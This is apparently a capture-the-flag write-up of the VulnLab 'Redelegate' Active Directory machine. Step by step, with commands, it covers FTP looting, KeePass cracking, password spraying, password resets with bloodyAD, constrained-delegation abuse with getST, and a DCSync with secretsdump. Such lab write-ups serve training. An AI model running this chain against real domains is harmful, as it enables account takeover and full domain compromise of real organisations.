---
layout: post
title: "Redelegate (Hard) — VulnLab"
date: 2026-02-02 22:00:00 +0100
categories:
  - Writeups
  - VulnLab
tags:
  - Redelegate
  - Hard
  - Windows
  - ActiveDirectory
  - ConstrainedDelegation
  - Kerberos
  - PrivEsc
image: assets/img/Writeup/VulnLab/Redelegate/redelegate-01.png
description: Hard Windows Active Directory machine writeup by Uzurly (VulnLab)
---

# Enumeration

Target: `10.129.94.98`, part of the `redelegate.vl` domain.

I generated a hosts file straight from the SMB banner instead of guessing the domain name:

```
nxc smb 10.129.94.98 --generate-hosts-file hosts
SMB         10.129.94.98    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)

cat hosts
10.129.94.98     DC.redelegate.vl redelegate.vl DC
```

## FTP — anonymous access

FTP accepted anonymous logins:

```
ftp 10.129.94.98
Connected to 10.129.94.98.
220 Microsoft FTP Service
Name (10.129.94.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

![1](/assets/img/Writeup/VulnLab/Redelegate/redelegate-01.png)
![2](/assets/img/Writeup/VulnLab/Redelegate/redelegate-02.png)

Browsing through the shared files, I found a KeePass database (`.kdbx`) sitting alongside some notes referencing a recurring seasonal naming pattern for passwords.

![3](/assets/img/Writeup/VulnLab/Redelegate/redelegate-03.png)

# Cracking the vault

## Building a targeted wordlist

Rather than throwing rockyou at a KeePass hash (painfully slow), I built a tiny wordlist based on the seasonal pattern I'd spotted:

```
Winter2024!
Spring2024!
Summer2024!
Fall2024!
Autumn2024!
```

## Hashcat

```
hashcat hash.txt seasons.txt --user -m 13400
...
$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*...:Fall2024!

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

Cracked instantly — `Fall2024!` was the master password.

![4](/assets/img/Writeup/VulnLab/Redelegate/redelegate-04.png)

## Reading the vault

Opening the database gave up a full list of stored credentials:

![5](/assets/img/Writeup/VulnLab/Redelegate/redelegate-05.png)

```
cat pass.txt
Spdv41gg4BlBgSYIW1gF
SguPZBKdRyxWzvXRWy6U
22331144
cVkqz4bCM7kJRSNlgx2G
zDPBpaF4FywlqIv11vii
hMFS4I0Kj8Rcd62vqi5X
cn4KOEgsHqvKXPjEnSD9
Fall2024!
```

![6](/assets/img/Writeup/VulnLab/Redelegate/redelegate-06.png)
![7](/assets/img/Writeup/VulnLab/Redelegate/redelegate-07.png)
![8](/assets/img/Writeup/VulnLab/Redelegate/redelegate-08.png)

# From leaked passwords to a domain foothold

## MSSQL RID brute force

One of the recovered passwords (`zDPBpaF4FywlqIv11vii`) belonged to a low-privileged SQL account, `SQLGuest`. I used it to RID-brute the domain over MSSQL:

```
nxc mssql 10.129.94.98 -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute 30000
```

![9](/assets/img/Writeup/VulnLab/Redelegate/redelegate-09.png)

That gave me a fresh list of valid domain usernames to pair against the password list dumped from the KeePass vault:

```
nxc smb 10.129.94.98 -u 'Users.txt' -p 'pass.txt'
SMB         10.129.94.98    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.94.98    445    DC               [+] redelegate.vl\Marie.Curie:Fall2024
```

Credential spraying paid off: `Marie.Curie:Fall2024!` is a valid domain account.

## BloodHound

```
nxc ldap 10.129.94.98 -u 'Marie.curie' -p 'Fall2024!' -c all --bloodhound --dns-server 10.129.94.98
```

![10](/assets/img/Writeup/VulnLab/Redelegate/redelegate-10.png)
![11](/assets/img/Writeup/VulnLab/Redelegate/redelegate-11.png)
![12](/assets/img/Writeup/VulnLab/Redelegate/redelegate-12.png)
![13](/assets/img/Writeup/VulnLab/Redelegate/redelegate-13.png)

BloodHound showed `Marie.Curie` holding a password-reset right over `Helen.Frost`, so I chained the abuse with `bloodyAD`:

```
bloodyAD --host 10.129.94.98 -d redelegate.vl -u Marie.curie -p 'Fall2024!' set Password Helen.frost 'Password123!'
[+] Password changed successfully!
```

# Privilege escalation — abusing constrained delegation

`Helen.Frost` in turn had rights over the `FS01$` machine account, so I reset its password too:

```
bloodyAD --host 10.129.94.98 -d redelegate.vl -u Helen.frost -p 'Password123!' set Password FS01$ Password123!
[+] Password changed successfully!
```

With a shell as `Helen.Frost`:

![14](/assets/img/Writeup/VulnLab/Redelegate/redelegate-14.png)

A quick `whoami /all` flagged something interesting: `SeEnableDelegationPrivilege` was assigned to the account — not a default right, and a strong hint that constrained delegation was the intended escalation path.

![15](/assets/img/Writeup/VulnLab/Redelegate/redelegate-15.png)

## Configuring constrained delegation on FS01$

Owning `FS01$`'s password meant I could configure delegation on it myself. I set the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag and pointed `msDS-AllowedToDelegateTo` at the domain controller's `cifs` service:

```
bloodyAD --host 10.129.94.98 -d redelegate.vl -u Helen.frost -p 'Password123!' set object 'FS01$' userAccountControl -v 528384
[+] FS01$'s userAccountControl has been updated

bloodyAD -d redelegate.vl --host "dc.redelegate.vl" -u helen.frost -p 'Password123!' add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl

bloodyAD --host 10.129.94.98 -d redelegate.vl -u Helen.frost -p 'Password123!' get object 'FS01$' --attr userAccountControl

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION; TRUSTED_TO_AUTH_FOR_DELEGATION
```

![16](/assets/img/Writeup/VulnLab/Redelegate/redelegate-16.png)

```
bloodyAD --host 10.129.94.98 -d redelegate.vl -u Helen.frost -p 'Password123!' set object 'FS01$' msDS-AllowedToDelegateTo -v "cifs/DC.redelegate.vl"
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

## S4U2Self / S4U2Proxy

With `FS01$` now trusted to delegate to `cifs/DC.redelegate.vl`, I requested a service ticket impersonating the Domain Controller's own account:

```
getST.py 'redelegate.vl/FS01$:Password123!' -spn cifs/dc.redelegate.vl -impersonate dc
```

![17](/assets/img/Writeup/VulnLab/Redelegate/redelegate-17.png)

# DCSync and root flag

The forged ticket let me pull secrets straight off the DC:

```
secretsdump -k -no-pass dc.redelegate.vl -just-dc-user Administrator
```

![18](/assets/img/Writeup/VulnLab/Redelegate/redelegate-18.png)

With the Administrator NT hash in hand, I authenticated over SMB and read the final flag:

```
nxc smb 10.129.94.98 -u 'Administrator' -H 'ec17f7a2a4d96e177bfd101b94ffc0a7' -x 'type C:\Users\Administrator\Desktop\root.txt'
```

![19](/assets/img/Writeup/VulnLab/Redelegate/redelegate-19.png)

# Takeaways

- Anonymous FTP access + a KeePass vault following a predictable seasonal naming pattern was enough to build a tiny, targeted wordlist and crack the master password in seconds — a good reminder that wordlist *quality* beats size when you can profile the target's habits.
- Password reuse (`Fall2024!` as both the vault master password and a real domain account's password) turned a local file leak into a domain foothold.
- `SeEnableDelegationPrivilege` on a compromised low-privileged account was the real signal here — non-default rights on `whoami /all` are always worth chasing.
- Once you can write `msDS-AllowedToDelegateTo` on a computer object you control, constrained delegation with protocol transition (S4U2Self/S4U2Proxy) turns that single account into a path to impersonate anyone — including the DC itself — against the delegated service.
